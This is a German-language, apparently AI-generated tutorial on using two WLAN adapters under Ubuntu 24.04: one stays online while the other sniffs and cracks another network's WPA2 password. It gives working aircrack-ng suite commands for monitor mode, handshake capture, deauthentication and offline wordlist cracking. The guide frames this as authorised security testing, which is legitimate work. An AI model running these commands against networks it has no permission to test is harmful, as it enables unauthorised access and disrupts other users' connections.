---
audio: false
generated: true
image: false
lang: de
layout: post
model: x-ai/grok-4-fast
title: Duale WLAN-Adapter für Sicherheitstests
translated: true
type: note
---

Ja, Ubuntu 24.04 kann sich mit einem bekannten Passwort mit einem WLAN-Netzwerk verbinden (für Internetzugang) und gleichzeitig versuchen, das Passwort eines anderen WLAN-Netzwerks zu "hacken" (z. B. zu knacken oder zu testen). Dies erfordert jedoch spezielle Hardware und eine sorgfältige Konfiguration, um Konflikte zu vermeiden. Dieses Setup ist üblich für ethische Penetration-Tests oder Sicherheitsaudits in eigenen Netzwerken – beachten Sie, dass unbefugter Zugriff illegal ist.

### Wichtige Voraussetzungen
- **Zwei WLAN-Adapter**: Sie benötigen mindestens zwei separate Drahtlos-Schnittstellen (z. B. integriertes Laptop-WLAN als `wlan0` für die Verbindung und einen USB-WLAN-Adapter als `wlan1` für die Überwachung). Ein einzelner Adapter kann nicht gleichzeitig verbunden (Managed Mode) und im Monitor Mode sein.
  - Empfohlene Adapter für den Monitor Mode: Intel (z. B. AX200/AX210), Atheros oder kompatible Realtek-Chipsätze. Überprüfen Sie die Kompatibilität mit `iw list` (suche nach "monitor" unter supported interface modes).
- **Tools**: Installieren Sie die `aircrack-ng` Suite zum Scannen, Erfassen von Handshakes und Knacken:
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Ubuntu 24.04 Besonderheiten**: Keine größeren Änderungen gegenüber früheren Versionen – NetworkManager verwaltet Verbindungen, aber Monitor-Mode-Tools können stören, wenn sie nicht richtig verwaltet werden. Der Kernel 6.8+ unterstützt moderne Adapter gut.

### So funktioniert es: Schritt-für-Schritt Einrichtung
1. **Verbinden Sie sich mit dem bekannten WLAN (Managed Mode)**:
   - Verwenden Sie NetworkManager (GUI oder CLI), um sich normal zu verbinden:
     ```
     nmcli device wifi connect "IhrBekanntesSSID" password "bekanntespasswort"
     ```
   - Überprüfen Sie: `nmcli connection show --active`. Dies hält Ihre Internetverbindung auf der ersten Schnittstelle aktiv (z. B. `wlan0`).

2. **Richten Sie den zweiten Adapter für die Überwachung ein (ohne den ersten zu stören)**:
   - Identifizieren Sie die Schnittstellen: `iw dev` (z. B. `wlan1` ist Ihr USB-Adapter).
   - Vermeiden Sie `airmon-ng` (von aircrack-ng), da es oft NetworkManager beendet und Verbindungen unterbricht. Verwenden Sie stattdessen manuelle `iw`-Befehle:
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - Überprüfen Sie: `iw dev` (sollte `type monitor` für `wlan1` anzeigen).

3. **Scannen und Erfassen für das Passwort-Knacken**:
   - Scannen Sie Netzwerke: `sudo airodump-ng wlan1` (listet SSIDs, BSSIDs, Kanäle auf; drücken Sie Strg+C zum Beenden).
   - Zielen Sie auf ein bestimmtes Netzwerk (z. B. BSSID `AA:BB:CC:DD:EE:FF` auf Kanal 6):
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     Dies erfasst Pakete in `capture-01.cap`. Für WPA2-Knacken warten Sie auf einen 4-Wege-Handshake (oder erzwingen Sie einen ethisch mit Deauth: `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`).
   - Knacken Sie offline: `sudo aircrack-ng -w /pfad/zur/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`.

4. **Stellen Sie den Normalbetrieb wieder her**:
   - Beenden Sie die Überwachung:
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - Verbinden Sie sich bei Bedarf neu: Starten Sie NetworkManager neu (`sudo systemctl restart NetworkManager`) oder verwenden Sie `nmcli`.

### Mögliche Probleme und Lösungen
- **Verbindungsabbrüche**: Wenn die erste WLAN-Verbindung abbricht (selten bei manueller Methode), erneuern Sie DHCP: `sudo dhclient -r wlan0 && sudo dhclient wlan0`.
- **Interferenz**: Beenden Sie störende Prozesse nur auf der Monitor-Schnittstelle: `sudo airmon-ng check kill` (betrifft aber alle – verwenden Sie mit Vorsicht).
- **USB-Adapter-Stabilität**: Einige billige Adapter brechen im Monitor Mode ab; testen Sie mit `iwconfig` oder `iw dev`.
- **Kabelgebundene Alternative**: Wenn kein zweites WLAN vorhanden ist, verwenden Sie Ethernet für Internet und überwachen Sie mit dem einzelnen WLAN-Adapter (einfacher, da das Beenden von NetworkManager kabelgebundene Verbindungen nicht beeinflusst).

Dieses Setup funktioniert zuverlässig unter Ubuntu 24.04 für Testzwecke. Holen Sie immer eine Erlaubnis ein, bevor Sie Netzwerke testen.

### Referenzen
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)